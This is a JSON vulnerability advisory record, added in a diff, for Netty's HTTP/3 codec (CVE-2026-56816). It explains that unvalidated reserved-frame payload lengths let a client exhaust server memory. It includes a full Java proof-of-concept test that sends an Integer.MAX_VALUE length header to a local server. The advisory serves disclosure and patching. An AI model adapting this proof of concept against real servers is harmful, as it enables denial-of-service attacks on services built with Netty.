@@ -1,0 +1,59 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-07-22T21:42:47Z",
+  "Package": {
+    "Ecosystem": "MAVEN",
+    "Name": "io.netty:netty-codec-http3"
+  },
+  "Advisory": {
+    "DatabaseId": 391215,
+    "Id": "GSA_kwCzR0hTQS1ocGNjLTI2eHEtMjVmds4ABfgv",
+    "GhsaId": "GHSA-hpcc-26xq-25fv",
+    "References": [
+      {
+        "Url": "https://github.com/netty/netty/security/advisories/GHSA-hpcc-26xq-25fv"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-56816"
+      },
+      {
+        "Url": "https://github.com/netty/netty/commit/5b68c61f37aa4a3045cba624cbea239655c9003b"
+      },
+      {
+        "Url": "https://github.com/netty/netty/releases/tag/netty-4.2.16.Final"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-hpcc-26xq-25fv"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-hpcc-26xq-25fv"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-56816"
+      }
+    ],
+    "Description": "### Summary\nNetty's Http3FrameCodec buffers incoming data for HTTP/3 reserved frame types up to the specified payload length without any limits. The payload length is read directly from the wire and trusted without validation. A bad actor can send a reserved frame with a payload length of up to Integer.MAX_VALUE, causing the server to buffer the data in memory. This leads to an OOM and a gradual Denial of Service due to memory exhaustion as multiple streams are opened.\n\n### Details\n`io.netty.handler.codec.http3.Http3FrameCodec#decodeFrame` handles reserved frame types as follows:\n\n```java\n                // Handling reserved frame types\n                // https://tools.ietf.org/html/draft-ietf-quic-http-32#section-7.2.8\n                if (in.readableBytes() \u003c payLoadLength) {\n                    return 0;\n                }\n```\n\nThe `payLoadLength` is read directly from the wire and trusted implicitly. Since `payLoadLength` can be up to Integer.MAX_VALUE and there is no maximum payload length enforcement for reserved frames, the decoder will accumulate bytes in memory until the wire-provided length is reached.\n\nThis allows a bad actor to exhaust server memory by opening multiple QUIC streams and sending reserved frames with large payload lengths, followed by a small amount of data (e.g., up to the defined limit) on each stream.\n\n### PoC\n\n```java\n    @Test\n    public void test() throws Exception {\n        EventLoopGroup group = new MultiThreadIoEventLoopGroup(1, NioIoHandler.newFactory());\n        try {\n            X509Bundle cert = new CertificateBuilder()\n                    .subject(\"cn=localhost\")\n                    .setIsCertificateAuthority(true)\n                    .buildSelfSigned();\n\n            QuicSslContext serverContext = QuicSslContextBuilder.forServer(cert.toTempPrivateKeyPem(), null, cert.toTempCertChainPem())\n                    .applicationProtocols(Http3.supportedApplicationProtocols())\n                    .build();\n\n            CountDownLatch serverConnectionClosed = new CountDownLatch(1);\n\n            ChannelHandler serverCodec = Http3.newQuicServerCodecBuilder()\n                    .sslContext(serverContext)\n                    .maxIdleTimeout(5000, TimeUnit.MILLISECONDS)\n                    .initialMaxData(10_000_000)\n                    .initialMaxStreamDataBidirectionalLocal(1_000_000)\n                    .initialMaxStreamDataBidirectionalRemote(1_000_000)\n                    .initialMaxStreamsBidirectional(100)\n                    .tokenHandler(InsecureQuicTokenHandler.INSTANCE)\n                    .handler(new ChannelInitializer\u003cQuicChannel\u003e() {\n                        @Override\n                        protected void initChannel(QuicChannel ch) {\n                            ch.closeFuture().addListener(f -\u003e serverConnectionClosed.countDown());\n                            ch.pipeline().addLast(new Http3ServerConnectionHandler(\n                                    new ChannelInboundHandlerAdapter() {\n                                        @Override\n                                        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n                                            cause.printStackTrace();\n                                            ctx.close();\n                                        }\n                                    }));\n                        }\n                    })\n                    .build();\n\n            Channel server = new Bootstrap()\n                    .group(group)\n                    .channel(NioDatagramChannel.class)\n                    .handler(serverCodec)\n                    .bind(\"127.0.0.1\", 0)\n                    .sync()\n                    .channel();\n\n            QuicSslContext clientContext = QuicSslContextBuilder.forClient()\n                    .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                    .applicationProtocols(Http3.supportedApplicationProtocols())\n                    .build();\n\n            ChannelHandler clientCodec = Http3.newQuicClientCodecBuilder()\n                    .sslContext(clientContext)\n                    .maxIdleTimeout(5000, TimeUnit.MILLISECONDS)\n                    .initialMaxData(10_000_000)\n                    .initialMaxStreamDataBidirectionalLocal(1_000_000)\n                    .build();\n\n            Channel client = new Bootstrap()\n                    .group(group)\n                    .channel(NioDatagramChannel.class)\n                    .handler(clientCodec)\n                    .bind(0)\n                    .sync()\n                    .channel();\n\n            QuicChannel quicChannel = QuicChannel.newBootstrap(client)\n                    .handler(new Http3ClientConnectionHandler())\n                    .remoteAddress(server.localAddress())\n                    .localAddress(client.localAddress())\n                    .connect()\n                    .get();\n\n            QuicStreamChannel rawStream =\n                    quicChannel.createStream(QuicStreamType.BIDIRECTIONAL, new ChannelInboundHandlerAdapter()).get();\n\n            ByteBuf header = Unpooled.buffer();\n\n            // Write reserved frame type (64)\n            header.writeByte(0x40);\n            header.writeByte(0x40);\n\n            // Write payload length (Integer.MAX_VALUE)\n            header.writeByte(0xC0);\n            header.writeByte(0x00);\n            header.writeByte(0x00);\n            header.writeByte(0x00);\n            header.writeByte(0x7F);\n            header.writeByte(0xFF);\n            header.writeByte(0xFF);\n            header.writeByte(0xFF);\n\n            rawStream.write(header);\n\n            // Write the maximum allowed payload\n            int payloadSize = 1_000_000;\n            ByteBuf payload = Unpooled.wrappedBuffer(new byte[payloadSize]);\n            rawStream.writeAndFlush(payload).sync();\n\n            assertTrue(quicChannel.isActive());\n\n            quicChannel.closeFuture().await(5, TimeUnit.SECONDS);\n            server.close().sync();\n            client.close().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n```\n\n### Impact\nDenial of Service due to gradual memory exhaustion. Any application using Netty's HTTP/3 codec is impacted.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-07-22T21:42:42Z",
+    "Severity": "HIGH",
+    "Summary": "Netty: Memory Exhaustion via HTTP/3 Reserved Frame Types",
+    "UpdatedAt": "2026-07-22T21:42:47Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 7.5,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "4.2.16.Final"
+      },
+      "VulnerableVersionRange": "\u003c 4.2.16.Final"
+    }
+  ]
+}
